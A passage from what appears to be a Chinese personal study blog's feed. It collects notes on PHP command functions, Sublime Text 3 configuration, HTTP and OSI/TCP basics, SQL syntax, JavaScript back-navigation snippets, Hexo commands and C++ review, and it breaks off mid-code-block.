<p>system() 输出并返回最后一行shell结果。<br>exec() 不输出结果，返回最后一行shell结果，所有结果可以保存到一个返回的数组里面。<br>passthru() 只调用命令，把命令的运行结果原样地直接输出到标准输出设备上。</p>
</blockquote>
</li>
</ul>
]]></content>
      <categories>
        <category>Learning</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>submit text 3初始配置</title>
    <url>/2018/07/13/submit-text-3%E5%88%9D%E5%A7%8B%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<h1 id="submit-text-3安装PyV8"><a href="#submit-text-3安装PyV8" class="headerlink" title="submit text 3安装PyV8"></a>submit text 3安装PyV8</h1><pre><code>有时下载 Emmet 后，使用会报出关于 PyV8 的错误这时需要我们手动去安装 PyV8</code></pre><blockquote>
<ul>
<li>1、在github上下载需要的包:<a href="https://github.com/emmetio/pyv8-binaries#readme" target="_blank" rel="noopener">传送门</a></li>
<li>2、把下载的压缩包解压到如下路径:</li>
</ul>
</blockquote>
<center>![](https://hdwcna.sn.files.1drv.com/y4mjH5OVRAwB6G0JaIFCGqy8W_nzQAqVDvaJ9Oi3smCZIY9JbR7eFWZSkBMXSLKsRu59f5AzuS5r7heiOKdWv6xtqN3JkD_Wg66FaF5q5_sQfuLCK6RXvEEKdJieai8r3LOoHCtnpqK-KMRJedq2-6r9r9l-CK3JG-YwKdOtxyXZlSasp-qBizzYi5nucfmItyjv96gw5ld3NWBz44J4DmqFg?width=681&height=29&cropmode=none)</center>
> - 3、重启submit text 3即可

<hr>
<h1 id="submit-text-3在浏览器中预览html等文件"><a href="#submit-text-3在浏览器中预览html等文件" class="headerlink" title="submit text 3在浏览器中预览html等文件"></a>submit text 3在浏览器中预览html等文件</h1><blockquote>
<ul>
<li>1、安装插件:“view in browser”</li>
<li>2、打开:“Preferences-&gt;Key Bindings-User”，输入如下内容:<br><code>[    { &quot;keys&quot;: [&quot;ctrl+alt+f&quot;], &quot;command&quot;: &quot;open_in_browser&quot; },]</code></li>
</ul>
</blockquote>
<hr>
<h1 id="submit-text-3在指定路径下在浏览器中预览"><a href="#submit-text-3在指定路径下在浏览器中预览" class="headerlink" title="submit text 3在指定路径下在浏览器中预览"></a>submit text 3在指定路径下在浏览器中预览</h1><blockquote>
<ul>
<li>1、安装插件:“SideBarEnhancements”</li>
<li>2、打开:“Preference-&gt;Package Settings-&gt;Side Bar-&gt;Settings User-User”，添加如下:</li>
</ul>
</blockquote>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"default_browser"</span>: <span class="string">"chrome"</span> <span class="comment">//one of this list: firefox, aurora, chrome, canary, chromium, opera, safari</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li>3、在侧边栏右键，找到“Project-&gt;Edit Preview URLs”，添加如下:</li>
</ul>
</blockquote>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"项目路径"</span>:&#123;</span><br><span class="line">        <span class="attr">"url_testing"</span>: <span class="string">"localhost地址"</span>,</span><br><span class="line">        <span class="attr">"url_production"</span>: <span class="string">"线上地址"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li>4、打开:“Preference-&gt;Package Settings-&gt;Side Bar-&gt;key Bindings-User”，添加如下:</li>
</ul>
</blockquote>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">&#123;</span><br><span class="line">        <span class="attr">"keys"</span>: [<span class="string">"ctrl+shift+f"</span>],</span><br><span class="line">        <span class="attr">"command"</span>: <span class="string">"side_bar_open_in_browser"</span>,</span><br><span class="line">        <span class="attr">"args"</span>: &#123;</span><br><span class="line">                    <span class="attr">"paths"</span>: [],</span><br><span class="line">                    <span class="attr">"type"</span>: <span class="string">"testing"</span>,</span><br><span class="line">                    <span class="attr">"browser"</span>: <span class="string">""</span></span><br><span class="line">                &#125;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>submit text 3</tag>
      </tags>
  </entry>
  <entry>
    <title>web基础知识</title>
    <url>/2018/07/11/web%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    <content><![CDATA[<h1 id="Url组成"><a href="#Url组成" class="headerlink" title="Url组成"></a>Url组成</h1><center>![](https://i.imgur.com/WJ0UKcd.png)</center>

<hr>
<h1 id="HTTP请求方式"><a href="#HTTP请求方式" class="headerlink" title="HTTP请求方式"></a>HTTP请求方式</h1><p><strong>HTTP协议中共定义了八种方法或者叫“动作”来表明对Request-URL制定的资源的不同操作方式，具体介绍如下:</strong></p>
<ul>
<li>1、OPTIONS: 返回服务器针对特定资源所支持的HTTP请求方法。也可以利用向Web服务器发送”*”的请求来测试服务器的功能性。</li>
<li>2、HEAD: 向服务器索要与个体请求相一致的响应，只不过响应将不会被返回。这一方法可以在不必传输整个响应内容的情况下，就可以获取包含在响应消息头中的<a href="https://baike.baidu.com/item/%E5%85%83%E4%BF%A1%E6%81%AF/7554993" target="_blank" rel="noopener">元信息</a>。</li>
<li>3、GET: 向特定的资源发出请求。</li>
<li>4、POST: 向指定资源提交数据进行处理请求(例如提交表单或者上传文件)。数据被包含在请求体中。POST请求可能会导致新的资源的创建和/或已有资源的修改。</li>
<li>5、PUT: 向指定资源位置上传其最新内容。</li>
<li>6、DELETE: 请求服务器删除Request-URL所标识的资源。</li>
<li>7、TRACE: 回显服务器收到的请求，主要用于测试或诊断。</li>
<li>8、CONNECT: HTTP/1.1协议中预留给能够将连接改为管道的代理服务器。</li>
</ul>
<p><font color="darkviolet" size="4"><center><strong>GET和POST的区别</strong></center></font></p>
<style>
table th:first-of-type {
width:10%;
}
</style>

<table>
<thead>
<tr>
<th align="center"></th>
<th align="center">GET</th>
<th align="center">POST</th>
</tr>
</thead>
<tbody><tr>
<td align="center">后退/刷新</td>
<td align="center">无害</td>
<td align="center">数据会被重新提交</td>
</tr>
<tr>
<td align="center">书签</td>
<td align="center">可收藏为书签</td>
<td align="center">不可收藏为书签</td>
</tr>
<tr>
<td align="center">缓存</td>
<td align="center">能被缓存</td>
<td align="center">不能缓存</td>
</tr>
<tr>
<td align="center">编码类型</td>
<td align="center">Application/x-www-form-urlencoded</td>
<td align="center">Application/x-www-form-urlencoded或multiparty/form-data。为二进制数据使用多重编码</td>
</tr>
<tr>
<td align="center">历史</td>
<td align="center">参数保存在浏览器历史中</td>
<td align="center">参数不会保存在浏览器历史中</td>
</tr>
<tr>
<td align="center">对数据长度的限制</td>
<td align="center">当发送数据时，GET方法向URL添加数据；URL的长度是受限制的(URL的最大长度是2048个字符)</td>
<td align="center">无限制</td>
</tr>
<tr>
<td align="center">对数据类型的限制</td>
<td align="center">只允许ASCII字符</td>
<td align="center">没有限制。也允许二进制数据</td>
</tr>
<tr>
<td align="center">安全性</td>
<td align="center">与POST相比，GET的安全性较差，因为所发送的数据是URL的一部分。所以在发送密码等                   敏感信息时绝不要使用GET。</td>
<td align="center">POST比GET更加安全，因为参数不会被保存在浏览器历史或web服务器日志中。</td>
</tr>
<tr>
<td align="center">可见性</td>
<td align="center">数据在URL中对所有人都都是可见的</td>
<td align="center">数据不会显示在URL中</td>
</tr>
</tbody></table>
<hr>
<h1 id="Javascript由哪几部分组成"><a href="#Javascript由哪几部分组成" class="headerlink" title="Javascript由哪几部分组成"></a>Javascript由哪几部分组成</h1><p>参考来源:<a href="https://www.jianshu.com/p/f6c94cfa3139" target="_blank" rel="noopener">https://www.jianshu.com/p/f6c94cfa3139</a></p>
<p>虽然JavaScript和ECMAScript通常被人用来表达相同的意思，但JavaScript的含义去比ECMA-262中规定的多得多。一个完整的JavaScript实现应由三个部分组成:</p>
<ul>
<li><p>1.<strong>核心(ECMAScript)</strong></p>
</li>
<li><p>2.<strong>文档对象模型(DOM)</strong></p>
</li>
<li><p>3.<strong>浏览器对象模型(BOM)</strong></p>
</li>
</ul>
<p><strong>核心(ECMAScript)</strong></p>
<p>由ECMA-262定义的ECMAScript是一种在国际认可的标准的脚本语言规范，与Web浏览器没有依赖关系。ECMA-262标准主要规定了这门语言由以下组成部分:</p>
<ul>
<li><p>1.语法</p>
</li>
<li><p>2.变量和数据类型</p>
</li>
<li><p>3.关键字和保留字</p>
</li>
<li><p>4.操作符</p>
</li>
<li><p>5.控制语句</p>
</li>
<li><p>6.对象</p>
</li>
</ul>
<p>2009年ECMAScript 5.0版正式发布。在很长一段时间，使用javaScript都是按照5.0的标准。2015年ECMAScript 6发布正式版本，官方称为ECMAScript 2015。ECMAScript定义了脚本语言的所有属性、方法和对象。因此抵用web客户端脚本编码时一定要遵循ECMAScript标准。</p>
<p><strong>文档对象模型(DOM)</strong></p>
<p>DOM(文档对象模型)是 HTML 和 XML 的应用程序接口(API)。DOM 将把整个页面规划成由节点层级构成的文档。HTML或XML页面中的每个组成部分都是某种类型的节点，这些节点又包含着不同类型的数据。</p>
<p><strong>浏览器对象模型(BOM)</strong></p>
<p>IE 3.0 和 Netscape Navigator 3.0 提供了一种特性 - BOM(浏览器对象模型)，可以对浏览器窗口进行访问和操作。使用 BOM，开发者可以移动窗口、改变状态栏中的文本以及执行其他与页面内容不直接相关的操作。</p>
<hr>
<h1 id="OSI模型-即开放式通信系统互联参考模型"><a href="#OSI模型-即开放式通信系统互联参考模型" class="headerlink" title="OSI模型:(即开放式通信系统互联参考模型)"></a>OSI模型:(即开放式通信系统互联参考模型)</h1><p>OSI/RM协议是由IOS(国际标准化组织)制定的，他有三个基本功能:<strong>提供给开发者一个必须的、通用的概念以便开发完善、可以用来解释不同系统的框架</strong>。</p>
<p>OSI将计算机网络体结构划分为<strong>七层</strong>:</p>
<ol>
<li><p><strong>物理层</strong>:将数据转化为可通过物理介质传送的电子信号。相当于有剧中的搬运工人。<br>物理层规定了激活、维持、关闭通信端点之间的机械性、电气特性、功能特性以及过程特性。该层为上层协议提供了一个传输数据的物理媒体。<br>在这一层，数据单位为比特(bit)。<br>属于物理层定义的典范规范代表包括:EIA/TIA RS-232、EIA/TIA RS-449、V.35、RJ-45等。</p>
</li>
<li><p><strong>数据链路层</strong>:决定访问网络介质的方式。在此层将数据分帧，并处理流控制。本层指定拓补结构并提供硬件寻址。相当于邮局中的拆装箱工人。<br>数据链路层在不可靠的物理介质上提供可靠的传输。<br>该层的作用包括:物理地址寻址、数据的成帧、流量控制、数据的检错、重发等。<br>在这一层，数据的单位成为帧。<br>数据链路层协议的代表包括:SDLC、HDLC、PPP、STP、帧中继等。</p>
</li>
<li><p><strong>网络层</strong>:使用权数据路由经过大型网络。相当于邮局中的排序工人。<br>网络层负责对子网间的数据包进行路由选择。网络层还可以实现拥塞控制、网际互联等功能。<br>在这一层数据的单位成为数据包。<br>网络层协议的代表包括:IP、PX、IP、SPF、RP、ARP、CMP、MP等。</p>
</li>
<li><p><strong>传输层</strong>:提供终端到终端的可靠连接。相当于公司中跑邮局的送信职员。<br>传输层是第一个端到端，即主机到主机的层次。传输层负责将数据分段并提供端到端的、可靠的或不可靠的传输。此外，传输层还要处理端到端的差错控制和流量控制问题。<br>在这一层输局的单位称为数据端。<br>传输层协议的代表包括:TCP、UDP、SPX等。</p>
</li>
<li><p><strong>会话层</strong>:允许用户使用简单易记的名称建立连接。相当于公司中收寄信、写信封与拆信封的秘书。<br>会话层管理主机之间的会话进程即负责建立、管理、终止进程之间的会话。会话层还利用在数据中插入校验点来实现数据的同步。</p>
</li>
<li><p><strong>表示层</strong>:协商数据交换格式。相当于公司中简报老板、替老板写信的助理。<br>表示层对上层数据或信息进行变换以保证一个主机应用层的信息可以被另一个主机的应用程序理解。表示层的数据转换包括输局的加密、压缩、格式转换等。</p>
</li>
<li><p><strong>应用层</strong>:用户的应用程序和网络之间的接口老板。<br>应用层为操作系统或网络应用程序提供访问网络服务的接口。<br>应用层协议的代表包括:Telnet、FTP、HTTP、SNMP等。</p>
</li>
</ol>
<hr>
<h1 id="TCP三次握手，四次挥手"><a href="#TCP三次握手，四次挥手" class="headerlink" title="TCP三次握手，四次挥手"></a>TCP三次握手，四次挥手</h1><h2 id="TCP三次握手"><a href="#TCP三次握手" class="headerlink" title="TCP三次握手:"></a>TCP三次握手:</h2><p>第一次握手:客户端发送syn包(syn=x)到服务器，并进入到SYN_SEND状态，等待服务器确认。</p>
<p>第二次握手:服务器收到syn包，必须确认客户端的SYN(ack=x+1)，同时自己也发送一个SYN包，即SYN+ACK包，此时服务器进入SYN_RECV状态。</p>
<p>第三次握手:客户端收到服务区的SYN+ACK包，向服务器发送确认包ACK(ack=y+1)，此包发送完毕，客户端进入ESTABLISHED状态，完成三次握手。</p>
<p>握手构成中传送的包里不含数据，三次握手完毕后，客户端与服务器才正式开始传送数据。理想状态下，TCP连接一旦建立，在通信双方的任何一方主动关闭连接前，TCP链接都将被一直保持下去。<br>确认号:其数值等于发送方的发送序号+1(即接收方期望接受的下一个序列号)。</p>
<h2 id="TCP四次挥手"><a href="#TCP四次挥手" class="headerlink" title="TCP四次挥手:"></a>TCP四次挥手:</h2><p>第一次挥手:主动关闭方发送一个FIN，用来关闭主动方到被动关闭方的数据传送。</p>
<p>第二次挥手:被动关闭方收到FIN包后，发送一个ACK给对方，确认序号为收到序号+1(与SYN相同，一个FIN展映一个序号)。</p>
<p>第三次挥手:被动关闭方发送一个FIN，用来关闭被动关闭方到主动关闭方的数据传送，也就是告诉主动关闭方，我的数据也发送完了，不会再给你发送数据。</p>
<p>第四次挥手:主动关闭方收到一个FIN包后，发送一个ACK给被动关闭方，确认序号为收到序号+1，至此，完成四次挥手。<br><img src="https://i.imgur.com/KUMYzwx.png" alt></p>
<hr>
]]></content>
      <categories>
        <category>Learning</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>Web</tag>
        <tag>url</tag>
        <tag>HTTP</tag>
        <tag>Javascript</tag>
        <tag>OSI模型</tag>
        <tag>TCP三次握手，四次挥手</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL常用语句--增删改查</title>
    <url>/2018/07/02/SQL%E5%B8%B8%E7%94%A8%E8%AF%AD%E5%8F%A5-%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/</url>
    <content><![CDATA[<h2 id="查"><a href="#查" class="headerlink" title="查"></a>查</h2><blockquote>
<p>查全部: <code>select * from &lt;tablename&gt;;</code><br>条件查询:<code>select &lt;filed&gt; from &lt;tablename&gt; where &lt;field&gt;=&lt;key&gt;;</code><br>带有函数查询: <code>select count(*) from &lt;tablename&gt;;</code><br>模糊查询: <code>select &lt;field&gt; from &lt;tablename&gt; where &lt;field&gt; like ‘%value%’;</code></p>
</blockquote>
<hr>
<h2 id="增"><a href="#增" class="headerlink" title="增"></a>增</h2><blockquote>
<p>添加库: <code>create database &lt;databasename&gt;;</code><br>创建新表: <code>create table &lt;tablename&gt; (col1 type1, col2, ...);</code> 主键自增: <code>create table test1(id int primary key auto_increment,name varchar(20))auto_increment=1;</code><br>插入数据: <code>insert into &lt;tablename&gt;(field1,field2……) values(value1,value2………);</code><br>增加一列: <code>alter table &lt;tablename&gt; add column &lt;colname&gt; &lt;coltype&gt;;</code><br>添加主键: <code>alter table &lt;tablename&gt; add primary key(col);</code></p>
</blockquote>
<hr>
<h2 id="改"><a href="#改" class="headerlink" title="改"></a>改</h2><blockquote>
<p>更新: <code>update &lt;tablename&gt; set &lt;field&gt;=&lt;value&gt; where &lt;条件&gt;;</code></p>
</blockquote>
<hr>
<h2 id="删"><a href="#删" class="headerlink" title="删"></a>删</h2><blockquote>
<p>删除库: <code>drop database &lt;databasename&gt;;</code><br>删除表: <code>delete from &lt;tablename&gt; where &lt;条件&gt;;</code>(会留下日志文件，能被还原修复)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>truncate table &lt;tablename&gt;;</code>(不会留下日志文件，不能被还原修复)</p>
</blockquote>
<hr>
<h2 id="子句"><a href="#子句" class="headerlink" title="子句:"></a>子句:</h2><blockquote>
<p>where子句:= , &gt; , &lt; , &lt;&gt;(不等于) , &gt;= , &lt;=<br>order by子句:asc (升序) , desc(降序)</p>
</blockquote>
<hr>
]]></content>
      <categories>
        <category>Learning</category>
      </categories>
      <tags>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>网页返回上一页的几种方法</title>
    <url>/2018/07/01/%E9%A1%B5%E8%BF%94%E5%9B%9E%E4%B8%8A%E4%B8%80%E9%A1%B5/</url>
    <content><![CDATA[<h2 id="以按钮点击的方式实现"><a href="#以按钮点击的方式实现" class="headerlink" title="以按钮点击的方式实现"></a>以按钮点击的方式实现</h2><blockquote>
<p><code>&lt;input type=&quot;button&quot; name=&quot;Submit&quot; value=&quot;返回上一页&quot; onclick=&quot;javascript:window.history.back(-1);&quot;&gt;</code><br>或者<br><code>&lt;input type=&quot;button&quot; name=&quot;Submit&quot; value=&quot;返回上一页&quot; onclick=&quot;javascript:history.back(-1);&quot;&gt;</code></p>
</blockquote>
<hr>
<h2 id="一点击图片的方式实现"><a href="#一点击图片的方式实现" class="headerlink" title="一点击图片的方式实现"></a>一点击图片的方式实现</h2><blockquote>
<p><code>&lt;img src=&quot;图片的路径&quot; onclick=&quot;javascript:window.history.back(-1);&quot; title=&quot;返回上一页&quot; alt=&quot;返回点击图片&quot; /&gt;</code><br>或者<br><code>&lt;img src=&quot;图片的路径&quot; onclick=&quot;javascript:history.back(-1);&quot; title=&quot;返回上一页&quot; alt=&quot;返回点击图片&quot; /&gt;</code></p>
</blockquote>
<hr>
<h2 id="文字点击的方式实现"><a href="#文字点击的方式实现" class="headerlink" title="文字点击的方式实现"></a>文字点击的方式实现</h2><blockquote>
<p><code>&lt;a href=&quot;javascript:history.back(-1)&quot;&gt;返回上一页&lt;/a&gt;</code><br>或者<br><code>&lt;a href=&quot;#&quot; onClick=&quot;javascript:history.back(-1);&quot;&gt;返回上一页&lt;/a&gt;</code></p>
</blockquote>
<hr>
<h2 id="图片链接的方式实现"><a href="#图片链接的方式实现" class="headerlink" title="图片链接的方式实现"></a>图片链接的方式实现</h2><blockquote>
<p><code>&lt;a href=&quot;javascript:window.history.back(-1)&quot; target=&quot;_self&quot;&gt;&lt;img src=&quot;图片的路径&quot; /&gt;&lt;/a&gt;</code><br>或者<br><code>&lt;a href=&quot;javascript:history.back(-1)&quot; target=&quot;_self&quot;&gt;&lt;img src=&quot;图片的路径&quot; /&gt;&lt;/a&gt;</code></p>
</blockquote>
<hr>
<h2 id="过几秒钟后返回上一页"><a href="#过几秒钟后返回上一页" class="headerlink" title="过几秒钟后返回上一页"></a>过几秒钟后返回上一页</h2><blockquote>
<p><code>&lt;script language=&quot;javascript&quot;&gt;setTimeout(&quot;window.history.go(-1)&quot;,3000)&lt;/script&gt;</code><br>或者<br><code>&lt;script language=&quot;javascript&quot;&gt;setTimeout(&quot;history.go(-1)&quot;,3000)&lt;/script&gt;</code></p>
</blockquote>
<hr>
]]></content>
      <categories>
        <category>Learning</category>
      </categories>
      <tags>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo常用命令</title>
    <url>/2018/06/29/Hexo%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h1 id="hexo-s"><a href="#hexo-s" class="headerlink" title="hexo s"></a><strong>hexo s</strong></h1><blockquote>
<p><code>hexo s</code><br>hexo s 是 hexo serve 的缩写，用于本地预览: <a href="http://localhost:4000/" target="_blank" rel="noopener">http://localhost:4000/</a></p>
</blockquote>
<hr>
<h1 id="hexo-clean"><a href="#hexo-clean" class="headerlink" title="hexo clean"></a><strong>hexo clean</strong></h1><blockquote>
<p>清除缓存文件 db.json 和已生成的静态文件 public<br>网页异常清除缓存</p>
</blockquote>
<hr>
<h1 id="hexo-new"><a href="#hexo-new" class="headerlink" title="hexo new"></a>hexo new</h1><blockquote>
<p><code>hexo new 笔记名称</code><br>新建一篇标题为“笔记名称”的文章</p>
</blockquote>
<hr>
<h1 id="hexo-d"><a href="#hexo-d" class="headerlink" title="hexo d"></a>hexo d</h1><blockquote>
<p><code>hexo d</code><br>hexo d 是 hexo deploy 的缩写。<br>用于自动生成静态文件，并部署到仓库。</p>
</blockquote>
<hr>
<h1 id="hexo-g"><a href="#hexo-g" class="headerlink" title="hexo g"></a>hexo g</h1><blockquote>
<p><code>hexo g</code><br>hexo g 是 hexo generate 的缩写。<br>用于生成网站静态文件到默认的 public 文件夹。</p>
</blockquote>
<hr>
<h1 id="hexo-new-page"><a href="#hexo-new-page" class="headerlink" title="hexo new page"></a>hexo new page</h1><blockquote>
<p><code>hexo new page name</code><br>新建一个标题为 name 的页面，默认链接地址为/name/<br>页面不会出现在首页文章列表和归档中，也不支持分类和标签。</p>
</blockquote>
<hr>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>C++复习！！！(课本:谭老爷爷版)</title>
    <url>/2018/06/24/c++%E5%A4%8D%E4%B9%A0/</url>
    <content><![CDATA[<h3 id="一、从C到C"><a href="#一、从C到C" class="headerlink" title="一、从C到C++"></a><font color="DarkViolet"><center>一、从C到C++</center></font></h3><hr>
<h4 id="C-如何实现I-O？它的优势在哪里？"><a href="#C-如何实现I-O？它的优势在哪里？" class="headerlink" title="C++如何实现I/O？它的优势在哪里？"></a>C++如何实现I/O？它的优势在哪里？</h4><ul>
<li>1、c++中I/O的概念<blockquote>
<p>在c++中有一个<strong>stream</strong>，这个类，所有的I/O都以这个“流”为基础，包括我们认识的文件I/O。stream有两个重要的运算符:</p>
<ul>
<li>a、<strong>插入器(&lt;&lt;)</strong>:向流输入数据。</li>
<li>b、<strong>析取器(&gt;&gt;)</strong>:从流中读取数据。</li>
</ul>
</blockquote>
</li>
<li>2、与c语言相比之下的优势<blockquote>
<p>1、最大的好处时完成了对流操作的<strong>封装</strong>。原来文件操作都是一个个分开的函数，现在的操作都是对象的方法。<br>2、stream适用于设备输入和输出的。fstream是stream的派生类，即文件流(设备对象是文件)，作为文件在c++中的一个抽象对象。</p>
</blockquote>
</li>
</ul>
<hr>
<h4 id="什么是重载函数？如何区分重载函数？"><a href="#什么是重载函数？如何区分重载函数？" class="headerlink" title="什么是重载函数？如何区分重载函数？"></a>什么是重载函数？如何区分重载函数？</h4><ul>
<li>1、什么是重载函数？<blockquote>
<p>c++允许在同一作用域中用同意函数名来定义多个函数，这些函数的参数个数和参数类型不相同，这些同名的函数用来实现不同的功能，这就是<strong>函数的重载</strong>，即一个<strong>函数名多用</strong>。</p>
</blockquote>
</li>
<li>2、区分函数重载<blockquote>
<ul>
<li>1、<strong>函数形参的个数</strong>；</li>
<li>2、<strong>函数形参的类型</strong>；</li>
<li>3、<strong>形参的顺序</strong>；</li>
<li>4、<strong>不能把返回值作为函数重载的条件</strong>，原因是编辑器在编译时不回去判断函数的返回类型，函数只有调用后，编译器才会去验证返回类型，所以返回值类型不能做为函数重载的依据；</li>
<li>5、<strong>常函数const可以作为函数重载的判断依据</strong>，原因:重载[]运算符时，有没有const的区别是:有const只读，没有const读写都可以。</li>
</ul>
</blockquote>
</li>
</ul>
<hr>
<h4 id="什么是函数模板？为什么要使用函数模板？"><a href="#什么是函数模板？为什么要使用函数模板？" class="headerlink" title="什么是函数模板？为什么要使用函数模板？"></a>什么是函数模板？为什么要使用函数模板？</h4><ul>
<li>1、什么是函数模板？<blockquote>
<p>建立一个通用函数，其函数类型和形参不具体指定，用一个虚函数的类型来代表，这个通用的函数就称为<strong>函数模板</strong>。</p>
<blockquote>
<p>例:max函数模板<br> <code>template&lt;typename T&gt;T max(T a, T b, T c) {}</code></p>
</blockquote>
</blockquote>
</li>
<li>2、为什么要使用函数模板？<blockquote>
<p><strong>简化</strong>对同名的知识形参类型不同的函数的定义。</p>
</blockquote>
</li>
</ul>
<hr>
<h4 id="使用带有默认参数的函数时，要注意些什么？"><a href="#使用带有默认参数的函数时，要注意些什么？" class="headerlink" title="使用带有默认参数的函数时，要注意些什么？"></a>使用带有默认参数的函数时，要注意些什么？</h4><ul>
<li><blockquote>
<p>1、如果函数的定义在函数调用之前，则应在函数定义中给出默认值。</p>
</blockquote>
</li>
<li><blockquote>
<p>2、一个函数不能既作为重载函数，又作为有默认参数的函数。</p>
</blockquote>
</li>
</ul>
<hr>
<h4 id="什么是变量的引用？要注意什么？"><a href="#什么是变量的引用？要注意什么？" class="headerlink" title="什么是变量的引用？要注意什么？"></a>什么是变量的引用？要注意什么？</h4><ul>
<li><blockquote>
<p>在c++中，变量的“引用”就是变量的别名，因此，<strong>引用</strong>又称<strong>别名</strong>。<br>建立“引用”的作用是为一个变量再起另一个名字，一边在需要时可以方便、间接地引用该变量。<br>对一个变量的“引用”的所有的操作，实际上都是对其所代表的(原来的)变量的操作。</p>
<blockquote>
<p>例:有一个变量a，想给他起一个别名b</p>
</blockquote>
</blockquote>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">int</span> a;</span><br><span class="line"><span class="built_in">int</span> &amp;b = a;</span><br></pre></td></tr></table></figure>
</li>
<li><blockquote>
<p>ATTENTION:由于引用不是独立的变量，编译系统给它单独分配储存单元，因此，在建立引用时只有声明没有定义，只是声明它和原有某一变量的关系。</p>
</blockquote>
</li>
</ul>
<hr>
<h4 id="为什么要使用inline函数？"><a href="#为什么要使用inline函数？" class="headerlink" title="为什么要使用inline函数？"></a>为什么要使用inline函数？</h4><ul>
<li><blockquote>
<p>为了<strong>提高效率</strong>。</p>
</blockquote>
</li>
<li><blockquote>
<p>调用函数时需要一定的时间，如果有些函数需要频繁使用，则累计所用时间会很长，从而降低程序的执行效率。<br>c++提供一种提高效率的方法，即在编译时，将所调用函数的代码嵌入到主调函数中。这种嵌入到主调函数中的函数称为<strong>内联函数</strong>。</p>
</blockquote>
</li>
</ul>
<hr>
<h4 id="作用域限定符“-”的作用是什么"><a href="#作用域限定符“-”的作用是什么" class="headerlink" title="作用域限定符“::”的作用是什么"></a>作用域限定符“::”的作用是什么</h4><ul>
<li><blockquote>
<p>在c++中，不同作用域内声明的变量可以同名，当局部变量和全局变量同名时，在局部变量中引用全局变量用到作用域限定符“<strong>::</strong>”。<br>当全局变量和局部变量名字相同，重载时，就规定:<br>用 “<strong>:: + 全局变量名</strong>” 来称呼全局变量。</p>
</blockquote>
</li>
</ul>
<hr>
<h3 id="二、类和对象"><a href="#二、类和对象" class="headerlink" title="二、类和对象"></a><font color="DarkViolet"><center>二、类和对象</center></font></h3><hr>
<p><strong><font size="6" color="OrangeRed"><center>程序 = 对象 + 对象</center></font></strong><br><strong><font size="6" color="OrangeRed"><center>对象 = 算法 + 数据结构</center></font></strong></p>
<hr>
<h4 id="什么是类？什么是对象？什么是抽象？什么是类的声明、类的定义？"><a href="#什么是类？什么是对象？什么是抽象？什么是类的声明、类的定义？" class="headerlink" title="什么是类？什么是对象？什么是抽象？什么是类的声明、类的定义？"></a>什么是类？什么是对象？什么是抽象？什么是类的声明、类的定义？</h4><ul>
<li><p><strong>对象</strong>:</p>
<blockquote>
<p>客观世界中任何一个事物都可以看成一个<strong>对象</strong>(object)。</p>
</blockquote>
</li>
<li><p><strong>类</strong>:</p>
<blockquote>
<p>类是所有面向对象语言的共同特征，所有面向对象的语言都提供了这种类型。</p>
</blockquote>
</li>
<li><p><strong>抽象</strong>:</p>
<blockquote>
<p><strong>类</strong>是<strong>对象</strong>的抽象，而对象是类的具体实例。</p>
</blockquote>
</li>
<li><p><strong>数据抽象</strong>: </p>
<blockquote>
<p>只向外界提供关键信息，并隐藏其后台的实现细节，即只表现必要的信息而不呈现细节。数据抽象是一种依赖于接口和实现分离的编程(设计)技术。</p>
</blockquote>
</li>
<li><p><strong>类的声明</strong>:</p>
<blockquote>
</blockquote>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">class</span> 类名 &#123;</span><br><span class="line"><span class="attribute">private</span>:</span><br><span class="line">	私有的数据和成员函数;</span><br><span class="line"><span class="attribute">public</span>:</span><br><span class="line">	公用的数据和成员函数;</span><br><span class="line"><span class="attribute">protected</span>:</span><br><span class="line">	受保护的数据和成员函数;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>类的定义</strong>:</p>
<blockquote>
</blockquote>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1、先声明，后定义:</span></span><br><span class="line"><span class="comment">//(1)、</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> 类名 对象名1,<span class="type">对象名2</span>,<span class="type">...;</span></span></span><br><span class="line"><span class="comment">//(2)、</span></span><br><span class="line">类名 对象名<span class="number">1</span>,对象名<span class="number">2</span>,...;</span><br><span class="line"></span><br><span class="line"><span class="comment">//2、声明同时定义:</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> 类名 </span>&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	私有的数据和成员函数;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	公用的数据和成员函数;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	受保护的数据和成员函数;</span><br><span class="line">&#125;对象名<span class="number">1</span>,对象名<span class="number">2</span>,...;</span><br><span class="line"></span><br><span class="line"><span class="comment">//3、不出现类名直接定义对象(非常 不建议 使用):</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> </span>&#123;</span><br><span class="line"><span 